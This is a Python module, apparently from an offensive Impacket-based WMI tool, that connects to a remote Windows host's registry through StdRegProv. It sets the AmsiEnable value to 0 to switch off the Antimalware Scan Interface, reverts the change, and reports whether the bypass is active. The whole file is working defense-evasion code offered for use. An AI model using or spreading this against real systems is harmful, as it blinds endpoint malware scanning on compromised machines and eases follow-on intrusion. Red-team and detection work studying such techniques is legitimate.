from impacket.dcerpc.v5.dtypes import NULL

class AMSI:
    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login
    
    def query_AMSIStatus(self):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        out = StdRegProv.GetDWORDValue(2147483649, 'Software\\Microsoft\\Windows Script\\Settings', 'AmsiEnable')
        if out.uValue == 0:
            print("[+] AMSI Bypassed!")
        else:
            print("[-] AMSI current is working.")

        iWbemServices.RemRelease()

    def amsi_Wrapper(self, flag):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        if flag == 'enable':
            print("[+] Enabling AMSI bypass.")
            StdRegProv.SetDWORDValue(2147483649, 'Software\\Microsoft\\Windows Script\\Settings', 'AmsiEnable', 0)
        elif flag == 'disable':
            print("[+] Disabling AMSI bypass.")
            StdRegProv.DeleteValue(2147483649, 'Software\\Microsoft\\Windows Script\\Settings', 'AmsiEnable')
        out = StdRegProv.GetDWORDValue(2147483649, 'Software\\Microsoft\\Windows Script\\Settings', 'AmsiEnable')
        if out.uValue == 0:
            print("[+] AMSI Bypassed!")
        elif out.uValue == None:
            print("[+] Remove AMSI bypass.")
        iWbemServices.RemRelease()